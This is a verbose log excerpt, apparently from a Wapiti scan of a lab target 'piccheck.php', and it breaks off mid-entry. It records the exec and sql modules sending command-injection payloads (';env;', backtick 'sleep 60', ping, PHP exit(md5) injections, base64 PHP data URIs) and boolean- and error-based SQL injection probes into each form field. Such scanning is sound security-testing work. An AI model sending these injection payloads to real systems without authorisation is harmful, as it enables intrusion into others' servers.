@@ -1,0 +1,673 @@
+2024-03-20 14:31:42.560 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:42.697 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 14:31:42.697 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_b6c37030.db
+2024-03-20 14:31:42.700 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 1 URLs and forms during the scan
+2024-03-20 14:31:42.731 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 14:31:42.732 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 14:31:42.734 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 14:31:42.842 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 14:31:42.842 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-20 14:31:42.881 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 14:31:42.912 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 14:31:42.942 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-20 14:31:42.961 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:42.964 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=%3Benv%3B&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:42.975 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=%7Cenv%7C&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:42.984 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=a%3Benv%3B&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:42.992 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=a%3Benv%3B&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.002 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.014 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%3Benv%3B&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.025 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%0Aenv%3B&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.033 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=%26set%26&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.045 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=set&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.057 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=env&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.069 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=%2Fe%00&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.081 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.093 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.105 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.116 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.129 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.140 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.151 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.163 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.175 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.187 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.199 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.211 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.224 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.236 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=a%60%29%60&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.248 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=a%60sleep%2060%60&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.260 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=a%3Bsleep%2060%3B&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.271 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=a%7Csleep%2060%3B&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.281 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=%26ping%20-n%2025%20127.0.0.1%26&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.291 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%3Benv%3B&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.300 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%7Cenv%7C&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.308 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=a%3Benv%3B&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.317 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=a%3Benv%3B&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.325 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.335 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%3Benv%3B&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.346 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%0Aenv%3B&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.357 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%26set%26&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.363 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=set&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.371 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=env&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.377 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%2Fe%00&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.384 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.391 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.397 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.404 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.410 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.418 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.425 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.433 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.440 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.447 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.454 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.460 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.467 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.477 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=a%60%29%60&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.487 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=a%60sleep%2060%60&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.501 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=a%3Bsleep%2060%3B&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.508 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=a%7Csleep%2060%3B&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.517 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=%26ping%20-n%2025%20127.0.0.1%26&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.526 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%3Benv%3B
+2024-03-20 14:31:43.535 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%7Cenv%7C
+2024-03-20 14:31:43.542 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=a%3Benv%3B
+2024-03-20 14:31:43.550 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=a%3Benv%3B
+2024-03-20 14:31:43.558 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-20 14:31:43.565 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%3Benv%3B
+2024-03-20 14:31:43.573 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%0Aenv%3B
+2024-03-20 14:31:43.580 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%26set%26
+2024-03-20 14:31:43.587 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=set
+2024-03-20 14:31:43.595 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=env
+2024-03-20 14:31:43.606 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%2Fe%00
+2024-03-20 14:31:43.617 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:31:43.629 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:31:43.639 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:31:43.651 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:31:43.662 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:31:43.672 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:31:43.684 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:31:43.696 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:31:43.706 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:31:43.718 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:31:43.728 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 14:31:43.739 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 14:31:43.747 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-20 14:31:43.755 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=a%60%29%60
+2024-03-20 14:31:43.762 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=a%60sleep%2060%60
+2024-03-20 14:31:43.769 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=a%3Bsleep%2060%3B
+2024-03-20 14:31:43.775 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=a%7Csleep%2060%3B
+2024-03-20 14:31:43.782 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-20 14:31:43.803 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 14:31:43.815 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.815 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%C2%BF%27%22%28&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.823 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz%C2%BF%27%22%28&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.831 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz&userfile=fuzz&MAX_FILE_SIZE=fuzz%C2%BF%27%22%28
+2024-03-20 14:31:43.848 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%20AND%2036%3D129%20AND%2010%3D10&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.859 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%20AND%2042%3D131%20AND%2082%3D82&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.871 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%20AND%2039%3D39%20AND%2093%3D93&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.880 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%27%20AND%2081%3D178%20AND%20%2795%27%3D%2795&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.892 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%27%20AND%2063%3D138%20AND%20%2744%27%3D%2744&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.902 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%27%20AND%2064%3D64%20AND%20%2764%27%3D%2764&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.913 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%22%20AND%2087%3D167%20AND%20%2234%22%3D%2234&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.923 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%22%20AND%2032%3D106%20AND%20%2281%22%3D%2281&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.934 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%22%20AND%2084%3D84%20AND%20%2211%22%3D%2211&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.948 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%29%20AND%2030%3D106%20AND%20%2863%3D63&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.962 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%29%20AND%2038%3D120%20AND%20%2833%3D33&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.974 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%29%20AND%2032%3D32%20AND%20%2853%3D53&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.985 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%27%29%20AND%2013%3D33%20AND%20%28%2776%27%3D%2776&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:43.998 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%27%29%20AND%2079%3D165%20AND%20%28%2773%27%3D%2773&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.012 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%27%29%20AND%2096%3D96%20AND%20%28%2761%27%3D%2761&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.025 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%22%29%20AND%2024%3D88%20AND%20%28%2283%22%3D%2283&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.040 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
+	data: name=fuzz%22%29%20AND%2025%3D118%20AND%20%28%2292%22%3D%2292&userfile=fuzz&MAX_FILE_SIZE=fuzz
+2024-03-20 14:31:44.055 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/piccheck.php (0)
